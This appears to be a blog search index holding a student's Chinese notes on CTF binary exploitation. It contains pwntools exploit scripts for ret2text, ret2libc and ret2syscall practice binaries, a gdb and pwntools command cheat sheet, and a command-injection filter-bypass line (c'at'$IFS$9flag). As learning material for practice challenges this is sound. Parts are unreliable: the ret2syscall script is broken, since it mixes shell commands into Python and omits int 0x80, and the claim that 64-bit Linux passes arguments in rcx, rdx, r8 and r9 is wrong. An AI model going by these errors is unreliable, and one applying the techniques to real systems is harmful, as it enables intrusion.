<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>pwn学习之路</title>
    <link href="/2024/12/17/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
    <url>/2024/12/17/pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181900612.png" alt="image-20241218190029502"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182000685.png" alt="image-20241218200048617"></p><p>NSS-pwn 第一题</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172038999.png"></p><p>输入su</p><p>进入root模式；(管理员模式)</p><p>binsh    &#x2F;bin&#x2F;sh    sh</p><p>bash</p><p>&#x2F;</p><p>c’at’$IFS$9flag</p><p>通过构造和发送一个有效载荷，利用缓存区溢出漏洞</p><p>先调用pwntools库</p><p>利用process函数建立一个进程</p><h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><h3 id="x32位"><a href="#x32位" class="headerlink" title="x32位"></a>x32位</h3><p>最简单：有system有binsh</p><p>有后门函数的地址（直接system（binsh））</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2text&quot;</span>)<br>system = <span class="hljs-number">0x008048506</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(system)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="x64位"><a href="#x64位" class="headerlink" title="x64位"></a>x64位</h3><p>（注意栈平衡）</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172125376.png" alt="image-20241217212559335"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2textx64&quot;</span>)<br><br><span class="hljs-comment"># gdb.attach(p, &#x27;b*0x00000000004011A2&#x27;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000004011A9</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h4 id="堆栈平衡"><a href="#堆栈平衡" class="headerlink" title="堆栈平衡"></a>堆栈平衡</h4><p>（32位没有，64位有）</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172153628.png" alt="image-20241217215337601"></p><h5 id="原因："><a href="#原因：" class="headerlink" title="原因："></a>原因：</h5><p>64位架构中，系统要求函数调用前堆栈必须16字节对齐。因为64位函数在执行时要求堆栈在特定的对齐条件下。</p><h5 id="要求："><a href="#要求：" class="headerlink" title="要求："></a>要求：</h5><p>保证payload要求是16的倍数（p64是将其转换成8字节）</p><h4 id="p64是什么意思"><a href="#p64是什么意思" class="headerlink" title="p64是什么意思"></a>p64是什么意思</h4><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412172152557.png" alt="image-20241217215212527"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412181911976.png" alt="image-20241218191118934"></p><h4 id="字节-字符-字节串"><a href="#字节-字符-字节串" class="headerlink" title="字节&amp;字符&amp;字节串"></a>字节&amp;字符&amp;字节串</h4><h6 id="字节Byte"><a href="#字节Byte" class="headerlink" title="字节Byte"></a>字节Byte</h6><p>数据在内存&#x2F;程序中以字节的形式储存。</p><p>1个字节有由8个bit组成</p><p>‘A’占一个字节，其二进制表示为 <code>01000001</code></p><h6 id="字符Character"><a href="#字符Character" class="headerlink" title="字符Character"></a>字符Character</h6><h6 id="字节串Bytes"><a href="#字节串Bytes" class="headerlink" title="字节串Bytes"></a>字节串Bytes</h6><p>用b’ ‘或b” “表示</p><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>寻找binsh</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc1&quot;</span>)<br>system = <span class="hljs-number">0x8048519</span><br>binsh = <span class="hljs-number">0x0804A028</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)+p32(system)+p32(binsh)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Ret2libc2"><a href="#Ret2libc2" class="headerlink" title="Ret2libc2"></a>Ret2libc2</h2><p>有sys没有binsh</p><p>需要自己填入;</p><p>查看地址：</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412182010114.png" alt="image-20241218201007056"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./ret2libc2&quot;</span>)<br>system = elf.plt[<span class="hljs-string">&quot;system&quot;</span>]<br>gets = elf.plt[<span class="hljs-string">&quot;gets&quot;</span>]<br>bss = <span class="hljs-number">0x0804A200</span><br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload += p32(gets)+p32(system)+p32(bss)+p32(bss)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h2><h5 id="没有system，没有binsh"><a href="#没有system，没有binsh" class="headerlink" title="没有system，没有binsh"></a>没有system，没有binsh</h5><p>32位：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>p = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>) //利用vmmap<br><br>gets_got = elf.got[<span class="hljs-string">&quot;gets&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>main_addr = <span class="hljs-number">0x0804854E</span>                     //回到main函数再次栈溢出<br><br>p.recvuntil(<span class="hljs-string">b&quot;ret2libc3\n&quot;</span>)<br>payload1 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload1 += p32(puts_plt)+p32(main_addr)+p32(gets_got)    <br>p.sendline(payload1)                      //打印出gets函数的got表<br><br>leak_addr = u32(p.recv(<span class="hljs-number">4</span>))                 //接收，转换成整数<br>libc_base = leak_addr - libc.sym[<span class="hljs-string">&quot;gets&quot;</span>]   //算偏移<br><br><br><br><br>///////////第一种<br><br>libc.address = libc_base                   //整合<br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]               //找到system函数在libc库中的偏移<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))      //binsh在libc库的偏移<br><span class="hljs-comment"># p.recvuntil(&quot;ret2libc3\n&quot;)</span><br>payload2 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload2 +=p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)   //再次栈溢出，此时有system函数的地址，有binsh的地址<br>p.sendline(payload2)<br>p.interactive()<br><br>/////////第二种<br><br>system = libc.sym[<span class="hljs-string">&quot;system&quot;</span>]+libc_base<br>binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">&quot;/bin/sh&quot;</span>))+libc_base<br><span class="hljs-comment"># p.recvuntil(&quot;ret2libc3\n&quot;)</span><br>payload2 = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x108</span>+p32(<span class="hljs-number">0</span>)<br>payload2 +=p32(system)+p32(<span class="hljs-number">0</span>)+p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="栈溢出题型："><a href="#栈溢出题型：" class="headerlink" title="栈溢出题型："></a>栈溢出题型：</h2><p>1.有system，有binsh—-直接&#x2F;shift+f12调用</p><p>2.有system，无binsh—-</p><p>x32–利用bss段填入binsh</p><p>x64–利用pop</p><p>3.没system，没binsh</p><p>x32—-利用栈结构传参</p><p>x64—-pop利用寄存器传参</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn打题之基础巩固(指令)</title>
    <link href="/2024/12/08/pwn%E6%89%93%E9%A2%98%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%B7%A9%E5%9B%BA(%E6%8C%87%E4%BB%A4%EF%BC%89/"/>
    <url>/2024/12/08/pwn%E6%89%93%E9%A2%98%E4%B9%8B%E5%9F%BA%E7%A1%80%E5%B7%A9%E5%9B%BA(%E6%8C%87%E4%BB%A4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="指令："><a href="#指令：" class="headerlink" title="指令："></a>指令：</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ls      显示当前目录下的所有文件<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc     与服务器建立连接<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">chmod pwn 提高文件的权限<br></code></pre></td></tr></table></figure><p>查看文件里库函数的位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ldd 文件名<br></code></pre></td></tr></table></figure><h2 id="1-查看文件类型："><a href="#1-查看文件类型：" class="headerlink" title="1.查看文件类型："></a>1.查看文件类型：</h2><h3 id="ls-文件名"><a href="#ls-文件名" class="headerlink" title="ls 文件名"></a>ls 文件名</h3><p>进入Linux命令行页面</p><p>输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ls 文件名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412081649726.png" alt="image-20241208164945577"></p><p><strong>什么是 ELF 文件？</strong></p><p>ELF 文件是一种可以在 Linux 和类 Unix 操作系统上运行的可执行文件格式。就像 Windows 的可执行文件是 .exe，Linux 用的是这种 ELF 格式。</p><ol><li><strong>ELF 32-bit LSB executable</strong>:<ul><li><strong>32-bit</strong>: 这个文件是针对 32 位计算机设计的。如果你想象计算机的处理能力，32 位表示可以一次处理的数据量相对较小（比如说，最多能处理大约4GB的内存）。</li><li><strong>LSB (Least Significant Byte first)</strong>: 小端格式意味着文件中的数据是按照最低有效字节先存储的，这有助于计算机理解和处理数据。</li></ul></li><li><strong>Intel 80386</strong>:<ul><li>这个文件是为一种叫 <strong>80386</strong> 的处理器设计的。这是上世纪80年代的一款处理器，是许多现代 PC 处理器的基础。将其想象成一个老式的计算机型号。</li></ul></li><li><strong>version 1 (SYSV)</strong>:<ul><li><strong>version 1</strong>: 指的是这个文件遵循的某个规则或标准的版本。</li><li><strong>SYSV</strong>: 代表 “System V”，这是一个早期 Unix 操作系统的标准。这个标准帮助不同程序在不同的 Unix 系统之间更好地合作。</li></ul></li><li><strong>dynamically linked</strong>:<ul><li>意思是这个程序在运行时需要其他支持文件（称为动态链接库），这些支持文件会在程序启动时加载。比如说，你的程序需要使用某个功能，这个功能的代码并不在程序内部，而是在外部的共享库里。这使得不同程序可以一起使用同一份代码，节省资源。</li></ul></li><li><strong>interpreter &#x2F;lib&#x2F;ld-linux.so.2</strong>:<ul><li>这部分告诉我们该程序在运行时需要使用的加载器的路径。加载器的作用是帮助程序找到那些它需要的外部文件，准备好一切后再启动这个程序。</li><li><code>/lib/ld-linux.so.2</code>是一个年份久远的动态链接器，负责处理这些动态链接的文件。</li></ul></li><li><strong>for GNU&#x2F;Linux 2.6.32</strong>:<ul><li>这个程序是为 GNU&#x2F;Linux 操作系统的 2.6.32 版本构建的。这是一个比较老的 Linux 内核版本，可以想象成一种操作系统的版本号。</li></ul></li><li><strong>BuildID[sha1]&#x3D;87f93ca8686d95b3d6f459eaf10366b4d6ff800d</strong>:<ul><li>这是一个用特殊的算法生成的唯一标识符，就像每个程序都有自己的身份证一样。这个 ID 可以帮助开发者找出这个特定版本的代码，便于追踪和问题修复。</li></ul></li><li><strong>not stripped</strong>:<ul><li>表示这个文件没有被“剥离”，也就是说，它保留了调试信息和符号表。假设你正在开发一个软件，保留这些信息可以帮助你找到代码中的错误和问题。</li><li>如果进行了剥离，这些信息会被删除，文件会变得更小，但也就失去了调试时所需的信息，从而使得找出错误变得更困难。</li></ul></li></ol><h2 id="2-查看程序防护"><a href="#2-查看程序防护" class="headerlink" title="2.查看程序防护"></a>2.查看程序防护</h2><h3 id="checksec-文件名"><a href="#checksec-文件名" class="headerlink" title="checksec 文件名"></a>checksec 文件名</h3><p>输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">checksec 文件名<br></code></pre></td></tr></table></figure><p>enter:</p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412081726351.png" alt="image-20241208172626305"></p><h2 id="3-查看文件头部信息"><a href="#3-查看文件头部信息" class="headerlink" title="3.查看文件头部信息"></a>3.查看文件头部信息</h2><h3 id="readelf-h-文件名"><a href="#readelf-h-文件名" class="headerlink" title="readelf -h 文件名"></a>readelf -h 文件名</h3><p>输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">readelf -h 文件名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412081735179.png" alt="image-20241208173501120"></p><h2 id="4-查看文件的所有信息"><a href="#4-查看文件的所有信息" class="headerlink" title="4.查看文件的所有信息"></a>4.查看文件的所有信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">readelf -a 文件名<br></code></pre></td></tr></table></figure><h2 id="5-查找ROP链"><a href="#5-查找ROP链" class="headerlink" title="5.查找ROP链"></a>5.查找ROP链</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ROPgadget --binary 文件名<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412081852980.png" alt="image-20241208185208885"></p><h2 id="6-过滤ROP链"><a href="#6-过滤ROP链" class="headerlink" title="6.过滤ROP链"></a>6.过滤ROP链</h2><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412081848843.png" alt="image-20241208184831791"></p><h2 id="7-本地测试"><a href="#7-本地测试" class="headerlink" title="7.本地测试"></a>7.本地测试</h2><p>运行程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">./文件名<br></code></pre></td></tr></table></figure><h2 id="8-远程调试"><a href="#8-远程调试" class="headerlink" title="8.远程调试"></a>8.远程调试</h2><p>连接远程服务器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">nc ip port<br></code></pre></td></tr></table></figure><h2 id="9-cyclic"><a href="#9-cyclic" class="headerlink" title="9.cyclic"></a>9.cyclic</h2><p>生成字符串队列：<code>cyclic 字符数</code></p><p>计算字符串偏移：<code>cyclic -l 四个字母</code></p><h2 id="10-gdb"><a href="#10-gdb" class="headerlink" title="10.gdb"></a>10.gdb</h2><p>选择文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">gdb 文件名<br>gdb ; file 文件名<br></code></pre></td></tr></table></figure><p>附加进程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">attach 进程ID<br></code></pre></td></tr></table></figure><p>运行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">run<br></code></pre></td></tr></table></figure><p><em>将文件数据作为运行参数：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">run &lt; file<br></code></pre></td></tr></table></figure><p>运行至程序入口：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">start<br></code></pre></td></tr></table></figure><p>单步步入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">si<br></code></pre></td></tr></table></figure><p>单步步过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ni<br></code></pre></td></tr></table></figure><p>在指定函数设置断点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b 函数名<br></code></pre></td></tr></table></figure><p>在指定地址设置断点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">b *地址<br></code></pre></td></tr></table></figure><p>继续运行程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">continue</span> | c<br></code></pre></td></tr></table></figure><p><em>查看所有寄存器的值：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">reg<br></code></pre></td></tr></table></figure><p><em>查看指定寄存器的值：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p $寄存器代号<br></code></pre></td></tr></table></figure><p><em>查看内存布局：</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">i proc mappings<br></code></pre></td></tr></table></figure><p>查看内存数据：</p><p><strong>以反汇编形式查看数据：x&#x2F;[字节数]i 地址</strong><br><strong>以32位十六进制形式查看数据：x&#x2F;[字节数]wx 地址</strong><br><strong>以64位十六进制形式查看数据：x&#x2F;[字节数]gx 地址</strong><br><strong>查看函数调用情况：backtrace | bt</strong></p><p>查看栈数据：stack</p><p><strong>查看所有函数定义：i functions</strong></p><p><strong>查看指定函数反汇编代码：disassemble 函数名</strong></p><p><strong>查看当前函数反汇编代码：disassemble $pc</strong></p><p><strong>查看libc动态地址：libc</strong></p><p><strong>查找字符串所在地址：search ‘字符串’</strong></p><h2 id="11-pwntools"><a href="#11-pwntools" class="headerlink" title="11.pwntools"></a>11.pwntools</h2><p>导入pwntools：from pwn import *</p><p><strong>输出调试信息：context.log_level &#x3D; ‘debug’</strong></p><p><strong>设置cpu架构：context.arch &#x3D; ‘i386’&#x2F;‘amd64’</strong></p><p>远程连接：sh &#x3D; remote(‘IP’，PORT)</p><p>本地运行：sh &#x3D; process(‘.&#x2F;elf’)</p><p>发送数据：sh.send(data)</p><p>发送数据，并在末尾加上换行符（\n）：sh.sendline(data)</p><p>在指定字符出现后输入指定字符串：sh.sendafter(‘等待的字符串’, ‘输入的字符串’)</p><p>在指定字符出现后输入指定字符串与回车：sh.sendlineafter(‘等待的字符串’, ‘输入的字符串’)</p><p><strong>接收数据，numb指定字节数，timeout指定超时时间：sh.recv(numb&#x3D;4096, timeout&#x3D;default)</strong></p><p><strong>接收一行数据，keepends表示是否保留行尾的换行符（\n）：sh.recvline(keepends&#x3D;True)</strong></p><p><strong>一直接收到字符串delims出现，drop表示是否保留参数1：sh.recvuntil(delims, drop&#x3D;False)</strong></p><p><strong>一直接收数据直到EOF：sh.recvall()</strong></p><p>进入shell模式：sh.interactive()</p><p>附加gdb调试：gdb.attach(sh)</p><p>加载elf文件：elf &#x3D; ELF(‘[文件名]’)</p><p>查看指定函数的PLT地址：function_plt &#x3D; elf.plt[‘函数名’]</p><p><strong>定位字符串静态偏移：elf.search(‘字符串’).next()</strong></p><p>将整数转换成32位的小端字节序：p32(整数)</p><p><strong>将4个字节转换成最多4字节的整数：u32(字符串.ljust(4, ‘\x00’))</strong></p><p>将整数转换成64位的小端字节序：p64(整数)</p><p><strong>将8个字节转换成最多8字节的整数：u64(字符串.ljust(8, ‘\x00’))</strong></p><p><strong>生成指定字符数量的字符串：str &#x3D; cyclic(字符数)</strong></p><p><strong>查找指定字符串偏移：index &#x3D; cyclic_find(‘四个字母’)</strong></p><p><strong>生成一段shellcode汇编代码：shellcode &#x3D; shellcraft.sh()</strong></p><p><strong>编译shellcode汇编代码为字节码：shellcode &#x3D; asm(shellcraft.sh())</strong></p><p>参考文章：<a href="https://blog.csdn.net/qq_41988448/article/details/103124339">https://blog.csdn.net/qq_41988448/article/details/103124339</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2libc艰难探索</title>
    <link href="/2024/12/06/ret2libc%E8%89%B0%E9%9A%BE%E6%8E%A2%E7%B4%A2/"/>
    <url>/2024/12/06/ret2libc%E8%89%B0%E9%9A%BE%E6%8E%A2%E7%B4%A2/</url>
    
    <content type="html"><![CDATA[<h1 id="1-64位和32位程序在函数传参方面的不同"><a href="#1-64位和32位程序在函数传参方面的不同" class="headerlink" title="1.64位和32位程序在函数传参方面的不同"></a>1.<strong>64位和32位程序在函数传参方面的不同</strong></h1><p>32位程序优先使用栈来传递参数，参数从右往左压入栈，然后执行call指令进行跳转到函数位置。</p><p>64位程序优先使用寄存器来进行存储参数，通常情况下， 前4个参数分别是 rcx rdx r8 r9从左到右放入寄存器进行传参，多余的参数通过栈传参。</p><p> PS:64位程序中rbp不当做栈底指针，当做通用寄存器</p><h2 id="2-静态编译没有system问题："><a href="#2-静态编译没有system问题：" class="headerlink" title="2.静态编译没有system问题："></a>2.静态编译没有system问题：</h2><p><strong>ret2syscall</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><br>p = process(<span class="hljs-string">&quot;./ret2syscall&quot;</span>)  <br>gdb.attach(p,<span class="hljs-string">&quot;b *0x080488ED&quot;</span>)  <br><br>ROPgadget --binary ./ret2syscall --string <span class="hljs-string">&quot;/bin/sh&quot;</span>  <br><br>binsh = <span class="hljs-number">0x080ea068</span>  <br><br>ROPgadget --binary ./ret2syscall --only <span class="hljs-string">&quot;int&quot;</span>  <br><br>int_0x80 = <span class="hljs-number">0x0806ce55</span>  <br><br><span class="hljs-comment">#  </span><br><br>pop_eax_ret = <span class="hljs-number">0x080b8526</span>  <br><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806f200</span>  <br><br>eax = <span class="hljs-number">11</span>  <span class="hljs-comment"># #define __NR_execve 11  </span><br>ebx = binsh  <br>ecx = <span class="hljs-number">0</span>  <br>edx = <span class="hljs-number">0</span>  <br><br>p.recvuntil(<span class="hljs-string">&quot;ret2syscall\n&quot;</span>)  <br>payload = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x108</span> + <span class="hljs-string">&quot;junk&quot;</span>  <br>payload += p32(pop_eax_ret) + p32(eax)  <br>payload += p32(pop_edx_ecx_ebx_ret) + p32(edx) + p32(ecx) + p32(ebx)  <br>p.sendline(payload)  <br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="3-动态编译没有system问题：ret2libc3"><a href="#3-动态编译没有system问题：ret2libc3" class="headerlink" title="3.动态编译没有system问题：ret2libc3"></a>3.动态编译没有system问题：ret2libc3</h1><h3 id="①认识PLT表和GOT表"><a href="#①认识PLT表和GOT表" class="headerlink" title="①认识PLT表和GOT表"></a>①<strong>认识PLT表和GOT表</strong></h3><h3 id="②构造函数链"><a href="#②构造函数链" class="headerlink" title="②构造函数链"></a>②<strong>构造函数链</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412071802341.png" alt="image-20241207180221270"></p><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412071851044.png" alt="image-20241207185117753"></p><h6 id="1-导入-Pwntools-库："><a href="#1-导入-Pwntools-库：" class="headerlink" title="1.导入 Pwntools 库："></a>1.<strong>导入 Pwntools 库：</strong></h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br></code></pre></td></tr></table></figure><ul><li>这行代码导入了<code>pwntools</code>库中的所有必要函数和类，以简化二进制利用任务。</li></ul><h6 id="2-加载目标二进制文件和库"><a href="#2-加载目标二进制文件和库" class="headerlink" title="2.加载目标二进制文件和库:"></a>2.<strong>加载目标二进制文件和库</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">elf = ELF(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)  <br>p = process(<span class="hljs-string">&quot;./ret2libc3&quot;</span>)  <br>libc = ELF(<span class="hljs-string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)<br></code></pre></td></tr></table></figure><ul><li><code>elf</code>: 代表目标二进制文件<code>ret2libc3</code>，可以提取全局偏移表（GOT）和过程链接表（PLT）的信息。</li><li><code>p</code>: 启动<code>ret2libc3</code>进程，以便与其进行交互。</li><li><code>libc</code>: 加载标准C库（libc），这个库中包含我们想要利用的函数，例如<code>system()</code>和<code>gets()</code>。</li></ul><h6 id="3-确定GOT和PLT条目"><a href="#3-确定GOT和PLT条目" class="headerlink" title="3.确定GOT和PLT条目:"></a>3.<strong>确定GOT和PLT条目</strong>:</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">pythongets_got = elf.got[<span class="hljs-string">&quot;gets&quot;</span>]  <br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]  <br>main_addr = <span class="hljs-number">0x0804854E</span>  <br></code></pre></td></tr></table></figure><ul><li><code>gets_got</code>: 获取<code>gets</code>函数在全局偏移表中的地址，该地址用于泄露libc函数的地址。</li><li><code>puts_plt</code>: 